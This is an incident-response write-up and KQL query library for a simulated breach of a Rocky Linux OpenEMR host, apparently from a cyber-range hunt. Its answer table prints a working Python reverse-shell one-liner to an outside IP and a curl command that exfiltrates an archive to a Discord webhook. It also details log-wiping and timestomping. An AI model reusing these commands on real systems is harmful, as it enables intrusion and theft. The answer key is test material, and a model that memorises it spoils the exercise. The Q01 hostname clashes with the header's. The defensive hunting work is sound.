# Hunt 07 — Rocky Clinic OpenEMR Breach
## KQL Query Library & IR Write-Up
**Platform:** Microsoft Sentinel (LAW: law-cyber-range)  
**Device:** `rocky83` / `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`  
**Hunt Period:** 2026-02-04 to 2026-02-14  
**Analyst:** Basilio Thrasher

---

## Critical Lessons Learned (Read First)

### 1. `TimeGenerated` vs `Timestamp`
MDE events have two time fields:
- **`Timestamp`** — when the event occurred on the device
- **`TimeGenerated`** — when the data was ingested into Log Analytics Workspace

For recent data these are nearly identical. For data that is weeks old, or when the MDE agent was mid-deployment during the event, **`TimeGenerated` is more reliable** for LAW queries. Several key events in this hunt (including the service file modification on 2/11) were only discoverable using `TimeGenerated`.

### 2. DeviceName Format Shift After Full MDE Deployment
Before full MDE deployment, the device reported as `rocky83` (short hostname).  
After deployment, it reported as the full FQDN: `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`.

- `DeviceName =~ "rocky83"` is an **exact match** — misses the FQDN entirely.
- `DeviceName contains "rocky83"` is a **substring match** — catches both forms.

**Always use `contains` for DeviceName when hunting across time boundaries.**

### 3. No FileModified ActionType in DeviceFileEvents
Rocky83's DeviceFileEvents only contained three ActionTypes: `FileCreated`, `FileDeleted`, `FileRenamed`. File modifications appeared as a `FileRenamed` (old file backed up to `.sh~`) followed by a `FileCreated` (new version written). Look for the `.sh~` rename pattern when hunting file edits.

### 4. Hyphenated Filenames in KQL
Filenames with hyphens (e.g., `integration-monitor.service`) require verbatim string syntax in some filter contexts: `@"integration-monitor.service"`.

---

## MITRE ATT&CK Technique Map

| Phase | Technique | ID |
|-------|-----------|-----|
| Initial Access | Valid Accounts | T1078 |
| Persistence | Systemd Service | T1543.002 |
| Privilege Escalation | Sudo | T1548.003 |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 |
| Defense Evasion | Indicator Removal: Timestomp | T1070.006 |
| Defense Evasion | Log Manipulation (sed -i) | T1565 |
| Credential Access | /etc/passwd edit via vipw | T1003 |
| Discovery | Container Discovery | T1613 |
| C2 | Encrypted Channel (443) | T1573 |
| Execution | Python Reverse Shell | T1059.006 |
| Exfiltration | Exfiltration Over Web Service (Discord) | T1567 |

---

## Attack Timeline

| Time (UTC) | Event |
|------------|-------|
| 2026-02-10 17:07 | `integration-monitor.service` created via `cat` (root) |
| 2026-02-10 18:10 | `backup_manifest.sh` first modified |
| 2026-02-10 18:11 | `backup_manifest.sh` modified again |
| 2026-02-10 19:29 | MDE agent installed on rocky83 |
| 2026-02-11 04:16 | `integration-monitor.service` modified via `vim` (it.admin) — **armed** |
| 2026-02-11 04:16 | `systemctl enable` + `systemctl start` — service activated |
| 2026-02-11 04:18 | python3 reverse shell connects → `/bin/sh -i` spawned (PID 8000) |
| 2026-02-11 04:20 | `scp` to 20.62.27.80:22 — **BLOCKED** by network controls |
| 2026-02-11 04:20 | `curl` to Discord webhook — **successful exfiltration** |
| 2026-02-11 16:13 | `sed -i` log erasure begins (12 operations across /var/log/secure + /var/log/messages) |
| 2026-02-11 16:47 | `touch -d "2026-02-06 12:00:00"` — /var/log/messages backdated |

---

## Phase 1 — Asset Validation

### Find device full hostname
```kql
DeviceInfo
| where DeviceName contains "rocky83"
| project DeviceName, OSPlatform, OSVersion
| distinct DeviceName
```

---

## Phase 2 — Persistence Discovery

### Find service file creation and all modifications (use TimeGenerated + contains)
```kql
let start = datetime('2026-02-10');
let end = datetime('2026-02-15');
DeviceFileEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky83"
| where FolderPath contains "service"
| where ActionType == "FileCreated"
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath,
          InitiatingProcessAccountName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, SHA256
| order by TimeGenerated asc
```
**What this finds:** Three versions of `integration-monitor.service` — creation (root/cat), armed modification (it.admin/vim), post-C2 modification (it.admin/vim).

### Find file modifications via rename pattern (backup_manifest.sh)
```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName =~ "rocky83"
| where ActionType == "FileRenamed"
| where FileName endswith ".sh~" or PreviousFileName endswith ".sh~"
| project Timestamp, ActionType, FileName, PreviousFileName, SHA256, FolderPath
| sort by Timestamp asc
```
**What this finds:** The `~` backup pattern that Linux editors and `sed -i` use when modifying files in place.

---

## Phase 3 — C2 Investigation

### Walk process events from service activation (use TimeGenerated)
```kql
let start = datetime('2026-02-11T04:16:01.991344Z');
let end = datetime('2026-02-15');
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where AccountName contains "admin"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```
**What this finds:** systemctl commands, python3 reverse shell executions (PIDs 7552, 7766, 7999), `/bin/sh -i` (PID 8000), exfiltration commands.

### Find all it.admin processes in reverse shell window
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11T20:28:00Z) .. datetime(2026-02-11T20:35:00Z))
| where DeviceName =~ "rocky83"
| where AccountName == "it.admin"
| project Timestamp, ProcessCommandLine, ProcessId, InitiatingProcessId,
          InitiatingProcessCommandLine, InitiatingProcessFileName, AccountName
| sort by Timestamp asc
```

### 17-second gap query (confirm telemetry gap between python3 and first post-shell command)
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11T20:28:59Z) .. datetime(2026-02-11T20:29:17Z))
| where DeviceName =~ "rocky83"
| project Timestamp, ProcessCommandLine, ProcessId, InitiatingProcessId, FileName, AccountName
| sort by Timestamp asc
```
**What this finds:** Only 8 results — python3 (6951), 3 busybox curl health checks, first post-shell commands. Confirms /bin/sh -i was not captured by MDE due to agent instability during installation.

### Find direct children of python3 reverse shell
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11T20:28:00Z) .. datetime(2026-02-11T20:35:00Z))
| where DeviceName =~ "rocky83"
| where InitiatingProcessId == 6951 or InitiatingProcessId == 7741
| project Timestamp, ProcessCommandLine, ProcessId, InitiatingProcessId, FileName, AccountName
| sort by Timestamp asc
```
**Result:** Zero children. Confirms /bin/sh -i PID was not captured under either python3 execution at 8:28 PM on 2/11. Shell PID 8000 is from the 4:18 AM activation when MDE was fully operational.

---

## Phase 4 — Credential Access / Discovery

### Find vipw usage (passwd file editing)
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName =~ "rocky83"
| where ProcessCommandLine has "vipw"
| project Timestamp, AccountName, ProcessCommandLine, ProcessId
```

### Find docker inspection commands
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName =~ "rocky83"
| where ProcessCommandLine has "docker inspect"
| project Timestamp, AccountName, ProcessCommandLine, ProcessId
| sort by Timestamp asc
```

---

## Phase 5 — Exfiltration

### Find failed transfer attempts (DeviceNetworkEvents)
```kql
let start = datetime('2026-02-11T04:16:01.991344Z');
let end = datetime('2026-02-15');
DeviceNetworkEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where ActionType contains "fail" or ActionType == "ConnectionFailed"
| project TimeGenerated, ActionType, RemoteIP, RemotePort,
          InitiatingProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```
**What this finds:** sftp connection to 20.62.27.80:22 blocked — the failed first exfil attempt.

### Find successful non-C2 network connections
```kql
let start = datetime('2026-02-11T04:22:00Z');
let end = datetime('2026-02-15');
DeviceNetworkEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where InitiatingProcessAccountName contains "admin"
| where RemoteIP != "20.62.27.80"
| where ActionType != "ConnectionFailed"
| project TimeGenerated, ActionType, RemoteIP, RemotePort,
          RemoteUrl, InitiatingProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```
**What this finds:** curl to Discord webhook (162.159.135.232:443) — successful exfiltration via SaaS platform.

### Find curl/wget exfil commands in process events
```kql
let start = datetime('2026-02-11T04:22:00Z');
let end = datetime('2026-02-15');
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where AccountName contains "admin"
| where ProcessCommandLine has "curl"
   or ProcessCommandLine has "wget"
   or ProcessCommandLine has "rclone"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```

---

## Phase 6 — Defense Evasion

### Count distinct sed -i delete operations against log files
```kql
let start = datetime('2026-02-11T16:13:00Z');
let end = datetime('2026-02-11T16:16:00Z');
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where FileName == "sed"
| where ProcessCommandLine has "/var/log/secure"
   or ProcessCommandLine has "/var/log/messages"
| project TimeGenerated, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```
**Result:** 12 distinct sed -i operations. Note: filter by `FileName == "sed"` (not `has "sed"`) to exclude sudo wrapper entries that MDE logs under the same PID.

### Find all sed operations with patterns (for full picture)
```kql
let start = datetime('2026-02-11T16:13:00Z');
let end = datetime('2026-02-11T16:16:00Z');
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where ProcessCommandLine has "sed" and ProcessCommandLine has "-i"
| where ProcessCommandLine has "/var/log/secure"
   or ProcessCommandLine has "/var/log/messages"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```

### Find timestamp backdating (touch -d)
```kql
let start = datetime('2026-02-11T16:13:00Z');
let end = datetime('2026-02-11T16:20:00Z');
DeviceProcessEvents
| where TimeGenerated between (start .. end)
| where DeviceName contains "rocky"
| where ProcessCommandLine has "touch"
   and ProcessCommandLine has "/var/log/messages"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```
**What this finds:** `touch -d "2026-02-06 12:00:00" /var/log/messages` — attacker backdated messages log by 5 days.

---

## Phase 7 — Alert Correlation

### Find EDR alerts on cleanup/timestamp activity
```kql
AlertEvidence
| where TimeGenerated between (datetime('2026-02-11T16:13:00Z') .. datetime('2026-02-11T17:00:00Z'))
| where isnotempty(AttackTechniques)
| project TimeGenerated, AlertId, Title, AttackTechniques, EntityType
| order by TimeGenerated asc
```
**What this finds:** "Suspicious timestamp modification" alerts with AttackTechniques: `["Indicator Removal (T1070)","Timestomp (T1070.006)"]`

### Broad alert search by suspicious keywords
```kql
AlertEvidence
| where TimeGenerated between (datetime('2026-02-11') .. datetime('2026-02-15'))
| where Title contains "timestamp"
   or Title contains "indicator"
   or Title contains "evasion"
   or Title contains "log"
   or Title contains "tamper"
| where isnotempty(AttackTechniques)
| project TimeGenerated, AlertId, Title, AttackTechniques, EntityType
| order by TimeGenerated asc
```

---

## Key Answers Reference

| Question | Answer |
|----------|--------|
| Q01 — Full hostname | `rocky83.a25bvds0ldetcy60khu05hda.cx.internal.cloudapp.net` |
| Q02 — Container runtime | `docker` |
| Q03 — Docker PID | `17507` |
| Q05 — Attacker account | `it.admin` |
| Q15 — Persistence account | `system` |
| Q16 — Account SHA256 | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` |
| Q17 — Persistence mechanism | `integration-monitor.service` |
| Q18 — File creation tool | `cat` |
| Q19 — Armed service file SHA256 | `f71ea834a9be9fb0e90c7b496e5312072ffedf1d1c0377957e05714bdac37b8` |
| Q20 — Reverse shell command | `/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| Q21 — /bin/sh -i PID | `8000` |
| Q22 — Staged archive | `integration_state_2026-02-10_22-00-01.tar.gz` |
| Q24 — Successful exfil command | `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/1471960320636620832/he16ZIRQsMI3kXOVBNeHYutbubwZ0xC-vq7A_phLZx-q4VOS88q4xOOvhxrBqy6nu9K` |
| Q25 — Exfil endpoint | `162.159.135.232:443` |
| Q26 — sed -i operations | `12` |
| Q27 — Log manipulation binary | `sed` |
| Q28 — Forged timestamp | `2026-02-06 12:00:00` |
| Q29 — Alert technique | `["Indicator Removal (T1070)","Timestomp (T1070.006)"]` |

---

## Detection Gaps Identified

1. **MDE agent instability during installation** — The `/bin/sh -i` process spawned by the initial python3 reverse shell (8:28:59 PM, PID 6951) was not captured in DeviceProcessEvents because MDE was mid-installation at that moment. The shell PID (8000) was only discoverable from the 4:16 AM activation when MDE was fully operational.

2. **DeviceName FQDN shift** — Queries using exact match (`=~`) on the short hostname missed all events logged after full MDE deployment. Any hunt spanning a device's MDE enrollment date must account for this.

3. **FileModified ActionType absence** — No `FileModified` events existed in DeviceFileEvents for this device. File modification detection required hunting the `FileRenamed` + `FileCreated` pair pattern instead.

4. **TimeGenerated vs Timestamp gap** — Events from 2026-02-11 04:16 UTC appeared only when querying `TimeGenerated`, not `Timestamp`. Critical for hunts on data that is weeks old in the LAW.
